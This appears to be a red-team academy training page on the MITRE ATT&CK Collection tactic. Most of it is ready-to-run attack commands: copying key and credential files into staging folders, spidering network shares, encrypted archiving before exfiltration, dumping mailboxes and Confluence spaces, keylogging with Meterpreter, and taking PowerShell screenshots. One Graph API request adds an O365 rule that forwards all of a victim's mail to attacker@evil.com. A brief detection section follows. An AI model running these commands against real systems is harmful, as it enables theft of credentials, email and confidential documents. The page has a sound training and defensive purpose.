---
layout: training-page
title: "TA0009 — Collection — Red Team Academy"
module: "MITRE ATT&CK Tactics"
tags:
  - mitre
  - att&ck
  - collection
  - data-staging
  - email-collection
  - sharepoint
page_key: "mitre-ta0009"
render_with_liquid: false
---

# TA0009 — Collection

Collection covers the techniques adversaries use to gather data of interest before exfiltration. The objective is to identify, locate, and aggregate mission-relevant data — credentials, intellectual property, PII, financial data, emails, or strategic documents. Effective collection is targeted and efficient: dumping the entire file system is slow, generates excess network traffic during exfiltration, and dramatically increases detection risk.

Modern red teams stage collected data locally (T1074), compress and encrypt it (T1560), and exfiltrate in small batches over the C2 channel or alternative protocols.

## Key Techniques

| T-ID | Technique | Sub-technique | Notes |
|------|-----------|---------------|-------|
| T1560 | Archive Collected Data | T1560.001 Archive via Utility | 7zip, zip, tar — compress before exfil |
| T1560 | Archive Collected Data | T1560.002 Archive via Library | In-memory archive, no disk artifact |
| T1560 | Archive Collected Data | T1560.003 Archive via Custom Method | Custom encryption before staging |
| T1123 | Audio Capture | — | Microphone recording on compromised endpoint |
| T1119 | Automated Collection | — | Scripts to enumerate and copy files automatically |
| T1115 | Clipboard Data | — | Monitor clipboard for passwords pasted in |
| T1530 | Data from Cloud Storage | — | AWS S3, Azure Blob, Google Drive enumeration |
| T1213 | Data from Information Repositories | T1213.001 Confluence | Dump all Confluence spaces |
| T1213 | Data from Information Repositories | T1213.002 SharePoint | Download SharePoint document libraries |
| T1213 | Data from Information Repositories | T1213.003 Code Repositories | GitHub/GitLab private repos — source + secrets |
| T1005 | Data from Local System | — | Targeted file copy from compromised host |
| T1039 | Data from Network Shared Drive | — | Spider mapped drives, pull documents |
| T1025 | Data from Removable Media | — | Access USB drives, portable storage |
| T1074 | Data Staged | T1074.001 Local Data Staging | Stage on compromised host before exfil |
| T1074 | Data Staged | T1074.002 Remote Data Staging | Stage on internal server, exfil from there |
| T1114 | Email Collection | T1114.001 Local Email Collection | Export Outlook .PST file from local profile |
| T1114 | Email Collection | T1114.002 Remote Email Collection | Exchange Web Services / Graph API email dump |
| T1114 | Email Collection | T1114.003 Email Forwarding Rule | Add O365 rule to forward all email to attacker |
| T1056 | Input Capture | T1056.001 Keylogging | Capture keystrokes — password interception |
| T1056 | Input Capture | T1056.002 GUI Input Capture | Fake dialog box captures credentials |
| T1113 | Screen Capture | — | Periodic screenshots for situational awareness |
| T1125 | Video Capture | — | Webcam recording |
| T1185 | Browser Session Hijacking | — | Steal live browser session cookies/tokens |

## Red Team Tooling

### Targeted File Collection

```
# Find interesting files by extension
Get-ChildItem -Recurse -Include *.pdf,*.docx,*.xlsx,*.kdbx,*.pem,*.key,*.pfx \
  -Path C:\Users\ | Copy-Item -Destination C:\Windows\Temp\staging\

# Find files containing keywords
Get-ChildItem -Recurse C:\Users\ -Include *.txt,*.xml,*.ini,*.config | \
  Select-String -Pattern "password|secret|api_key|token" | \
  Select-Object -ExpandProperty Path | Sort -Unique | \
  ForEach-Object { Copy-Item $_ C:\Windows\Temp\staging\ }

# Windows — robocopy for bulk copy
robocopy \\SERVER\share C:\Windows\Temp\staging /S /XO /R:1 /W:1

# Linux — targeted collection
find /home /etc /var -name "*.pem" -o -name "*.key" -o -name "id_rsa" 2>/dev/null | \
  xargs -I{} cp {} /tmp/staging/
```

### Network Share Spidering

```
# CrackMapExec spider_plus — enumerate and download files from shares
cme smb TARGET_IP -u user -p 'password' -M spider_plus
cme smb TARGET_IP -u user -p 'password' -M spider_plus \
  -o DOWNLOAD_FLAG=True EXCLUDE_EXTS=exe,dll EXCLUDE_FILTER=windows

# Invoke-ShareFinder + Invoke-FileFinder (PowerView)
Invoke-ShareFinder -Verbose | Out-File shares.txt
Invoke-FileFinder -ShareList .\shares.txt -Terms password,secret,creds
```

### Archive & Staging

```
# 7zip — compress and encrypt collected data
7z a -p'StagePassword' -mx=9 -mhe stage_data.7z C:\Windows\Temp\staging\

# PowerShell built-in zip
Compress-Archive -Path C:\Windows\Temp\staging\* -DestinationPath C:\Windows\Temp\data.zip

# Split into chunks for size-limited exfil
7z a -v5m -p'pass' split_archive.7z C:\Windows\Temp\staging\

# Linux tar + encrypt
tar -czf - /tmp/staging/ | openssl enc -aes-256-cbc -k StagePassword > /tmp/data.tar.gz.enc
```

### Email Collection (Exchange / M365)

```
# Exchange Web Services — dump mailbox via SOAP API
MailSniper.ps1 — Invoke-SelfSearch -Mailbox victim@corp.com -Terms "password","vpn","credentials"

# Microsoft Graph API (with stolen OAuth token)
# List messages:
curl -H "Authorization: Bearer ACCESS_TOKEN" \
  "https://graph.microsoft.com/v1.0/me/messages?\$top=50&\$select=subject,from,bodyPreview"

# Export full mailbox to PST (local Outlook)
Add-MailboxExportRequest -Mailbox "victim@corp.com" -FilePath "\\SERVER\share\victim.pst"

# Email forwarding rule (O365 via Graph API)
curl -X POST -H "Authorization: Bearer TOKEN" -H "Content-Type: application/json" \
  "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules" \
  -d '{"displayName":"Fwd","isEnabled":true,"actions":{"forwardTo":[{"emailAddress":{"address":"attacker@evil.com"}}]},"conditions":{"subjectContains":[""]}}'
```

### SharePoint / Confluence Collection

```
# Download entire SharePoint document library via Graph API
python3 roadtx.py get-sharepoint --site "https://corp.sharepoint.com/sites/Finance" \
  -t ACCESS_TOKEN --download-files

# Confluence — dump all spaces via REST API
curl -u user:token "https://confluence.corp.com/rest/api/content?type=page&limit=1000" \
  | jq '.results[].id' | xargs -I{} curl -u user:token \
  "https://confluence.corp.com/rest/api/content/{}/body/export/html" > dump.html
```

### Screen Capture & Keylogging

```
# Meterpreter — screenshot and keylogging
screenshot                     # one-shot screenshot
screengrab                     # continuous screenshot
keyscan_start                  # start keylogger
keyscan_dump                   # dump captured keystrokes

# PowerShell screenshot (no Meterpreter needed)
Add-Type -AssemblyName System.Windows.Forms
$screen = [System.Windows.Forms.Screen]::PrimaryScreen
$bitmap = New-Object Drawing.Bitmap($screen.Bounds.Width, $screen.Bounds.Height)
$graphics = [Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($screen.Bounds.Location, [Drawing.Point]::Empty, $screen.Bounds.Size)
$bitmap.Save("C:\Windows\Temp\screenshot.png")
```

## Detection Notes

- **Large file collection**: unusual access patterns on file servers — one account accessing hundreds of files across directories in a short window (UEBA / DLP alerts)
- **Email forwarding rules**: Alert on new inbox rules with forwarding to external addresses; Microsoft Purview / Defender for O365 monitors for this; Event logged in Exchange/Unified Audit Log
- **7zip/archive creation**: Sysmon Event 1 for 7z.exe execution with unusual paths; watch for compressed archives created in temp directories
- **SharePoint mass download**: SharePoint unified audit log — `FileAccessedExtended` events for bulk access from unusual IP/account
- **Keylogger**: anomalous registry entries for keyboard hooks; API hooking on SetWindowsHookEx (Sysmon/EDR)

## Related Academy Pages

- [Data Exfiltration](/post-exploitation/data-exfil/)
- [Browser Credential Extraction](/post-exploitation/browser-credentials/)
- [SaaS & Workspace Hijacking](/post-exploitation/saas-workspace/)
- [DPAPI Credential Extraction](/post-exploitation/dpapi-credentials/)
- [Microsoft 365 Attacks](/active-directory/m365-attacks/)

## Resources

- [TA0009 — MITRE ATT&CK Collection](https://attack.mitre.org/tactics/TA0009/)
- [T1114 — Email Collection](https://attack.mitre.org/techniques/T1114/)
- [T1213 — Data from Information Repositories](https://attack.mitre.org/techniques/T1213/)
- [MailSniper GitHub](https://github.com/dafthack/MailSniper)
